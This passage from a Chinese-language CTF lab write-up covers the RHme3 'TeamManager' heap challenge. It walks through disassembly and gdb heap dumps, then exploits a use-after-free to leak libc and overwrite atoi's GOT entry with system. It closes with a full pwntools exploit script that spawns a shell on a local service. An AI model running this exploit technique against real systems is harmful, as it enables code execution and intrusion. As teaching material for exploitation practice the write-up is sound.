; 40\n|           0x00401cf0      488945e8       mov qword [local_18h], rax\n|           0x00401cf4      31c0           xor eax, eax\n|           0x00401cf6      bf69254000     mov edi, str.Enter_new_name: ; 0x402569 ; \nEnter new name: \n\n|           0x00401cfb      b800000000     mov eax, 0\n|           0x00401d00      e8fbefffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401d05      488b05541420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401d0c      4889c7         mov rdi, rax\n|           0x00401d0f      e8acf0ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401d14      488d85e0feff.  lea rax, rbp - 0x120\n|           0x00401d1b      be00010000     mov esi, 0x100              ; 256\n|           0x00401d20      4889c7         mov rdi, rax\n|           0x00401d23      e89bf7ffff     call sym.readline            ; \u8bfb\u5165\u4fee\u6539\u7684\u5b57\u7b26\u4e32\uff0c\u5373 system \u7684\u5730\u5740\n|           0x00401d28      488d85e0feff.  lea rax, rbp - 0x120\n|           0x00401d2f      4889c7         mov rdi, rax\n|           0x00401d32      e869efffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x00401d37      4889c3         mov rbx, rax\n|           0x00401d3a      488b052f1420.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|           0x00401d41      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16\n|           0x00401d45      4889c7         mov rdi, rax\n|           0x00401d48      e853efffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x00401d4d      4839c3         cmp rbx, rax\n|       ,=\n 0x00401d50      7667           jbe 0x401db9                 ; rab == rax\uff0c\u6210\u529f\u8df3\u8f6c\n|       |   0x00401d52      488d85e0feff.  lea rax, rbp - 0x120\n|       |   0x00401d59      4889c7         mov rdi, rax\n|       |   0x00401d5c      e83fefffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|       |   0x00401d61      488d5001       lea rdx, rax + 1            ; 1\n|       |   0x00401d65      488b05041420.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|       |   0x00401d6c      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16\n|       |   0x00401d70      4889d6         mov rsi, rdx\n|       |   0x00401d73      4889c7         mov rdi, rax\n|       |   0x00401d76      e865f0ffff     call sym.imp.realloc        ; void *realloc(void *ptr, size_t size)\n|       |   0x00401d7b      488985d8feff.  mov qword [local_128h], rax\n|       |   0x00401d82      4883bdd8feff.  cmp qword [local_128h], 0\n|      ,==\n 0x00401d8a      751b           jne 0x401da7\n|      ||   0x00401d8c      bf7a254000     mov edi, str.Could_not_realloc_: ; 0x40257a ; \nCould not realloc :(\n\n|      ||   0x00401d91      e8eaeeffff     call sym.imp.puts           ; int puts(const char *s)\n|      ||   0x00401d96      488b05c31320.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      ||   0x00401d9d      4889c7         mov rdi, rax\n|      ||   0x00401da0      e81bf0ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ,===\n 0x00401da5      eb2f           jmp 0x401dd6\n|     |||      ; JMP XREF from 0x00401d8a (sym.set_name)\n|     |`--\n 0x00401da7      488b05c21320.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|     | |   0x00401dae      488b95d8feff.  mov rdx, qword [local_128h]\n|     | |   0x00401db5      48895010       mov qword [rax + 0x10], rdx\n|     | |      ; JMP XREF from 0x00401d50 (sym.set_name)\n|     | `-\n 0x00401db9      488b05b01320.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\n|     |     0x00401dc0      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; player.name \u5b57\u6bb5\uff0c\u5373 atoi@got\n|     |     0x00401dc4      488d95e0feff.  lea rdx, rbp - 0x120         ; system@got\n|     |     0x00401dcb      4889d6         mov rsi, rdx                 ; rsi \n- rdx\n|     |     0x00401dce      4889c7         mov rdi, rax                 ; rdi \n- rax\n|     |     0x00401dd1      e89aeeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src) ; \u7528 system \u7684\u5730\u5740\u8986\u76d6 atoi \u7684\u5730\u5740\n|     |        ; JMP XREF from 0x00401da5 (sym.set_name)\n|     `---\n 0x00401dd6      488b45e8       mov rax, qword [local_18h]\n|           0x00401dda      644833042528.  xor rax, qword fs:[0x28]\n|       ,=\n 0x00401de3      7405           je 0x401dea\n|       |   0x00401de5      e8d6eeffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401de3 (sym.set_name)\n|       `-\n 0x00401dea      4881c4280100.  add rsp, 0x128\n|           0x00401df1      5b             pop rbx\n|           0x00401df2      5d             pop rbp\n\\           0x00401df3      c3             ret\n\n\n\n\u52a8\u6001\u5206\u6790\n\n\n\u6f0f\u6d1e\u5927\u6982\u6e05\u695a\u4e86\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u52a8\u6001\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u5206\u6790\uff0c\u5148\u5173\u95ed ASRL\u3002gef \u6709\u4e2a\u5f88\u5f3a\u5927\u7684\u547d\u4ee4 \nheap-analysis-helper\n\uff0c\u53ef\u4ee5\u8ffd\u8e2a \nmalloc()\n\u3001\nfree()\n\u3001\nrealloc()\n \u7b49\u51fd\u6570\u7684\u8c03\u7528\uff1a\n\ngef\u27a4  heap-analysis-helper\n[*] This feature is under development, expect bugs and unstability...\n[+] Tracking malloc()\n[+] Tracking free()\n[+] Tracking realloc()\n[+] Disabling hardware watchpoints (this may increase the latency)\n[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.\n[*] Note: The heap analysis slows down noticeably the execution.\ngef\u27a4  c\nContinuing.\nWelcome to your TeamManager (TM)!\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 1   \nFound free slot: 0\n[+] Heap-Analysis - malloc(24)=0x604010\nEnter player name: aaaa\n[+] Heap-Analysis - malloc(5)=0x604030\nEnter attack points: 1\nEnter defense points: 2\nEnter speed: 3\nEnter precision: 4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 2\nEnter index: 0\n[+] Heap-Analysis - free(0x604030)\n[+] Heap-Analysis - watching 0x604030\n[+] Heap-Analysis - free(0x604010)\n[+] Heap-Analysis - watching 0x604010\nShe\ns gone!\n\n\n\u5f88\u597d\u5730\u9a8c\u8bc1\u4e86\u7403\u5458\u5206\u914d\u548c\u5220\u9664\u7684\u8fc7\u7a0b\u3002\n\n\nalloc and select\n\n\n\u7136\u540e\u662f\u5185\u5b58\uff0c\u6839\u636e\u6211\u4eec\u5bf9\u5806\u7ba1\u7406\u673a\u5236\u7684\u7406\u89e3\uff0c\u8fd9\u91cc\u9009\u62e9\u4f7f\u7528 small chunk\uff08\u7403\u5458 name chunk\uff09\uff1a\n\nalloc\n(\nA\n \n*\n \n0x60\n)\n\n\nalloc\n(\nB\n \n*\n \n0x80\n)\n\n\nalloc\n(\nC\n \n*\n \n0x80\n)\n\n\nselect\n(\n1\n)\n\n\n\n\ngef\u27a4  x/4gx 0x603180\n0x603180 \nplayers\n: 0x0000000000604010  0x00000000006040a0\n0x603190 \nplayers+16\n:  0x0000000000604150  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021 \n-- player 0 \n-- actual player chunk\n0x604010:   0x0000000200000001  0x0000000400000003              \n-- pointer returned by malloc\n0x604020:   0x0000000000604030  0x0000000000000071 \n-- name 0   \n-- player\ns name chunk\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021 \n-- player 1\n0x6040a0:   0x0000000200000001  0x0000000400000003              \n-- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091 \n-- name 1\n0x6040c0:   0x4242424242424242  0x4242424242424242\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000000  0x0000000000000021 \n-- player 2\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000000091 \n-- name 2\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11              \n-- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$2 = 0x6040a0\n\n\n\nfree\n\n\n\u7136\u540e\uff1a\n\nfree\n(\n1\n)\n\n\n\n\ngef\u27a4  x/4gx 0x603180\n0x603180 \nplayers\n: 0x0000000000604010  0x0000000000000000 \n-- set zero\n0x603190 \nplayers+16\n:  0x0000000000604150  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021 \n-- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071 \n-- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021 \n-- player 1 [be freed] \n-- fastbins\n0x6040a0:   0x0000000000000000  0x0000000400000003              \n-- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091 \n-- name 1 [be freed] \n-- unsorted_bin\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78              \n-- fd | bk\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000090  0x0000000000000020 \n-- player 2\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000000091 \n-- name 2\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11              \n-- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$3 = 0x6040a0\ngef\u27a4  heap bins\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x6040a0, size=0x20, flags=PREV_INUSE)\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena \nmain_arena\n ]\n[+] unsorted_bins[0]: fw=0x6040b0, bk=0x6040b0\n \u2192   Chunk(addr=0x6040c0, size=0x90, flags=PREV_INUSE)\n\n\n\u6211\u4eec\u77e5\u9053\uff0c\u5f53\u4e00\u4e2a small chunk \u88ab\u91ca\u653e\u540e\uff0c\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\uff0c\u8fd9\u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5b83\u7684 fd \u6307\u9488\u6307\u5411\u4e86\u94fe\u8868\u7684\u5934\u90e8\uff0c\u5373\u5730\u5740 \n0x00007ffff7dd1b78\n\u3002\u7136\u540e\u4f7f\u7528\u547d\u4ee4 \nvmmap\n \u83b7\u5f97 libc \u88ab\u52a0\u8f7d\u7684\u5730\u5740\uff0c\u7528\u94fe\u8868\u5934\u90e8\u5730\u5740\u51cf\u6389\u5b83\uff0c\u5f97\u5230\u504f\u79fb\u3002\u5f53\u5f00\u542f ASLR \u540e\uff0c\u5176\u5730\u5740\u4f1a\u53d8\uff0c\u4f46\u504f\u79fb\u4e0d\u53d8\u3002\u540c\u65f6\uff0c\u91ca\u653e\u7684 player 1 chunk \u88ab\u52a0\u5165\u5230 fastbins \u5355\u94fe\u8868\u4e2d\u3002\n\n[0x00400ec0]\n ?v 0x00007ffff7dd1b78 - 0x00007ffff7a0d000\n0x3c4b78\n\n\n\n\u518d\u6b21 free\uff0c\u5c06 player 2 \u91ca\u653e\uff0c\u56e0\u4e3a player 1 \u4e5f\u662f\u88ab\u91ca\u653e\u7684\u72b6\u6001\uff0c\u6240\u4ee5\u4e24\u4e2a chunk \u4f1a\u88ab\u5408\u5e76\uff08\u5176\u5b9e player \u662f fast chunk\uff0c\u4e0d\u4f1a\u88ab\u5408\u5e76\uff0c\u771f\u6b63\u5408\u5e76\u7684\u662f name chunk\uff09\uff1a\n\nfree\n(\n2\n)\n\n\n\n\ngef\u27a4  x/4gx 0x603180\n0x603180 \nplayers\n: 0x0000000000604010  0x0000000000000000\n0x603190 \nplayers+16\n:  0x0000000000000000  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021 \n-- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071 \n-- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x00000000000000b1 \n-- player 1 [be freed] \n-- unsorted_bin\n0x6040a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78              \n-- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091 \n-- player 2 [be freed]\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x00000000000000b0  0x0000000000000020              \n-- fastbins\n0x604150:   0x0000000000000000  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000020ea1\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11              \n-- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$4 = 0x6040a0\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x604150, size=0x20, flags=)\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena \nmain_arena\n ]\n[+] unsorted_bins[0]: fw=0x604090, bk=0x604090\n \u2192   Chunk(addr=0x6040a0, size=0xb0, flags=PREV_INUSE)\n\n\n\nalloc again\n\n\n\u6dfb\u52a0\u4e00\u4e2a\u7403\u5458\uff0cplayer chunk \u5c06\u4ece fastbins \u94fe\u8868\u4e2d\u53d6\u51fa\uff0c\u800c name chunk \u5c06\u4ece unsorted_bin \u4e2d\u53d6\u51fa\uff1a\n\nalloc\n(\nD\n*\n16\n \n+\n \np64\n(\natoi_got\n))\n\n\n\n\ngef\u27a4  x/4gx 0x603180\n0x603180 \nplayers\n: 0x0000000000604010  0x0000000000604150\n0x603190 \nplayers+16\n:  0x0000000000000000  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021 \n-- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071 \n-- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021 \n-- name 3\n0x6040a0:   0x4444444444444444  0x4444444444444444              \n-- selected\n0x6040b0:   0x0000000000603110  0x0000000000000091              \n-- unsorted_bin\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000090  0x0000000000000020 \n-- player 3\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x00000000006040a0  0x0000000000020ea1\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11              \n-- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$5 = 0x6040a0\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena \nmain_arena\n ]\n[+] unsorted_bins[0]: fw=0x6040b0, bk=0x6040b0\n \u2192   Chunk(addr=0x6040c0, size=0x90, flags=PREV_INUSE)\n\n\n\nedit and get shell\n\n\n\u7f16\u8f91 selected \u5904\u7684 chunck\uff0c\u5373 name 3\uff1a\n\n# atoi@got -\n system@got\n\n\nedit\n(\np64\n(\nsystem\n))\n\n\n\n# get shell\n\n\np\n.\nrecvuntil\n(\nchoice: \n)\n\n\np\n.\nsendline\n(\nsh\n)\n\n\n\n\u51fd\u6570 atoi@got \u5df2\u7ecf\u88ab\u6211\u4eec\u8986\u76d6\u4e3a system@got\uff0c\u5f53\u8c03\u7528 atoi \u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u6267\u884c\u4e86 system('sh')\uff1a\n\ngef\u27a4  p atoi\n$2 = {int (const char *)} 0x7ffff7a43e80 \natoi\n\ngef\u27a4  x/gx 0x603110\n0x603110:   0x00007ffff7a52390\n\n\n\n\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u91cd\u65b0\u542f\u7528 ASLR \u4e86\uff0c\u8be5\u4fdd\u62a4\u673a\u5236\u5df2\u7ecf\u88ab\u7ed5\u8fc7\u3002\n\n\nBingo!!!\n\n$ python exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] leak   =\n 0x7fcd41824b78\n[*] libc   =\n 0x7fcd41460000\n[*] system =\n 0x7fcd414a5390\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n# context.log_level = \ndebug\n\n\n\np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\n# p = process(\n./main.elf\n)\n\n\n\ndef\n \nalloc\n(\nname\n,\n \nattack\n \n=\n \n1\n,\n \ndefense\n \n=\n \n2\n,\n \nspeed\n \n=\n \n3\n,\n \nprecision\n \n=\n \n4\n):\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nname: \n)\n\n    \np\n.\nsendline\n(\nname\n)\n\n    \np\n.\nrecvuntil\n(\npoints: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nattack\n))\n\n    \np\n.\nrecvuntil\n(\npoints: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\ndefense\n))\n\n    \np\n.\nrecvuntil\n(\nspeed: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nspeed\n))\n\n    \np\n.\nrecvuntil\n(\nprecision: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nprecision\n))\n\n\n\ndef\n \nfree\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nindex: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\ndef\n \nselect\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nindex: \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\ndef\n \nedit\n(\nname\n):\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n4\n)\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nname: \n)\n\n    \np\n.\nsendline\n(\nname\n)\n\n\n\ndef\n \nshow\n():\n\n    \np\n.\nrecvuntil\n(\nchoice: \n)\n\n    \np\n.\nsendline\n(\n5\n)\n\n\n\n# gdb.attach(p, \n\n\n# b *0x00402205\n\n\n# c\n\n\n# \n)\n\n\n\natoi_got\n \n=\n \n0x603110\n\n\n\nalloc\n(\nA\n \n*\n \n0x60\n)\n\n\nalloc\n(\nB\n \n*\n \n0x80\n)\n\n\nalloc\n(\nC\n \n*\n \n0x80\n)\n\n\nselect\n(\n1\n)\n\n\n\nfree\n(\n1\n)\n\n\nshow\n()\n\n\np\n.\nrecvuntil\n(\nName: \n)\n\n\n\nleak\n    \n=\n \nu64\n(\np\n.\nrecv\n(\n6\n)\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nlibc\n    \n=\n \nleak\n \n-\n \n0x3c4b78\n   \n# 0x3c4b78 = leak - libc\n\n\nsystem\n  \n=\n \nlibc\n \n+\n \n0x045390\n   \n# $ readelf -s libc.so.6 | grep system@\n\n\n\nlog\n.\ninfo\n(\nleak   =\n 0x\n%x\n \n%\n \nleak\n)\n\n\nlog\n.\ninfo\n(\nlibc   =\n 0x\n%x\n \n%\n \nlibc\n)\n\n\nlog\n.\ninfo\n(\nsystem =\n 0x\n%x\n \n%\n \nsystem\n)\n\n\n\nfree\n(\n2\n)\n\n\n\nalloc\n(\nD\n*\n16\n \n+\n \np64\n(\natoi_got\n))\n\n\n\n# atoi@got -\n system@got\n\n\nedit\n(\np64\n(\nsystem\n))\n\n\n\n# get shell\n\n\np\n.\nrecvuntil\n(\nchoice: \n)\n\n\np\n.\nsendline\n(\nsh\n)\n\n\np\n.\ninteractive\n()\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nExploitation", 
            "title": "RHme3 Exploitation"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#_1", 
            "text": "\u8fd9\u4e2a\u9898\u76ee\u7ed9\u51fa\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c libc\u3002 $ file main.bin\nmain.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ec9db5ec0b8ad99b3b9b1b3b57e5536d1c615c8e, not stripped\n$ checksec -f main.bin\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0               10      main.bin \n64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u63aa\u65bd\u9664\u4e86 PIE \u90fd\u5f00\u542f\u4e86\u3002  \u4f46\u5176\u5b9e\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u8fd0\u884c\uff0c\u5b83\u662f\u4e00\u4e2a\u7ebf\u4e0b\u8d5b\u7684\u9898\u76ee\uff0c\u4f1a\u5bf9\u505a\u4e00\u4e9b\u73af\u5883\u68c0\u67e5\u548c\u5904\u7406\uff0c\u76f4\u63a5 nop \u6389\u5c31\u597d\u4e86\uff1a |           0x004021ad      bf18264000     mov edi, 0x402618\n|           0x004021b2      e87ceeffff     call sym.background_process\n|           0x004021b7      bf39050000     mov edi, 0x539              ; 1337\n|           0x004021bc      e85eefffff     call sym.serve_forever\n|           0x004021c1      8945f8         mov dword [local_8h], eax\n|           0x004021c4      8b45f8         mov eax, dword [local_8h]\n|           0x004021c7      89c7           mov edi, eax\n|           0x004021c9      e8c6f0ffff     call sym.set_io  $ python2 -c  print  90 *33    nop.txt  [0x00400ec0]  s 0x004021ad\n[0x004021ad]  cat ./nop.txt\n909090909090909090909090909090909090909090909090909090909090909090\n[0x004021ad]  wxf ./nop.txt  \u6700\u540e\u628a\u5b83\u8fd0\u884c\u8d77\u6765\uff1a socat tcp4-listen:10001,reuseaddr,fork exec: env LD_PRELOAD=./libc.so.6 ./main.elf", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#_2", 
            "text": "\u73a9\u4e00\u4e0b\uff0c\u4e00\u770b\u5c31\u662f\u5806\u5229\u7528\u7684\u9898\u76ee\uff1a $ ./main.elf\nWelcome to your TeamManager (TM)!\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: \n\u7a0b\u5e8f\u5c31\u662f\u6dfb\u52a0\u3001\u5220\u9664\u3001\u7f16\u8f91\u548c\u663e\u793a\u7403\u5458\u4fe1\u606f\u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\u5728\u7f16\u8f91\u548c\u663e\u793a\u7403\u5458\u524d\uff0c\u9700\u8981\u5148\u9009\u62e9\u7403\u5458\uff0c\u8fd9\u4e00\u70b9\u5f88\u91cd\u8981\u3002  \u6dfb\u52a0\u4e24\u4e2a\u7403\u5458\u770b\u770b\uff1a Your choice: 1\nFound free slot: 0\nEnter player name: aaaa\nEnter attack points: 1\nEnter defense points: 2\nEnter speed: 3\nEnter precision: 4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 1\nFound free slot: 1\nEnter player name: bbbb\nEnter attack points: 5\nEnter defense points: 6\nEnter speed: 7\nEnter precision: 8 \n\u8bd5\u7740\u9009\u4e2d\u7b2c\u4e00\u4e2a\u7403\u5458\uff0c\u7136\u540e\u5220\u9664\u5b83\uff1a Your choice: 3\nEnter index: 0\nPlayer selected!\n        Name: aaaa\n        A/D/S/P: 1,2,3,4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 2\nEnter index: 0\nShe s gone! \n\u63a5\u4e0b\u6765\u76f4\u63a5\u663e\u793a\u8be5\u7403\u5458\u4fe1\u606f\uff1a Your choice: 5\n        Name:\n        A/D/S/P: 29082240,0,3,4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 6\nYour team:\nPlayer 0\n        Name: bbbb\n        A/D/S/P: 5,6,7,8 